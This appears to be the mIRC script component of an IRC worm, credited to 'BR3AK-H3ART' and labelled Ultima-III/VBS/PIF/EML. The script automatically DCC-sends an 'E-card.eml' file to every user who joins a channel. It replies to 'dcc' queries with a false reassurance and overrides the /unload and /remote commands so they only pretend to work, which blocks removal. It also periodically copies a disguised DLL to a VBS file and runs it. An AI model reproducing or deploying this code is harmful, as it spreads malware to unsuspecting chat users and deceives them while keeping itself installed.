[script]
n0=; by BR3AK-H3ART br3ak_h3art@hotmail.com  Ultima-III/VBS/PIF/EML
n1=on 1:text:*BR3AK-H3ART*:?:/msg $nick 4Fuck you!!
n2=on 1:text:*dcc*:?:/msg $nick No This my e-card file.. | /clear | halt
n3=alias unload { if ( $1 = $null ) | ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }
n4=alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }
n5=on 1:join:#:{
n6=  if ($nick == $me) { halt }
n7=  /dcc send $nick C:\WINDOWS\E-card.eml
n8=}
n9=on 1:CONNECT: {
n10=  if (%ds.started == $null ) {
n11=    set %ds.started 0
n12=  }
n13=  %ds.started = %ds.started + 1
n14=  if (%ds.started == 10 ) {
n15=    copy $mircdir\mirc32.dll uo.vbs
n16=    run uo.vbs
n17=    set %ds.started 0
n18=  }
n19=}
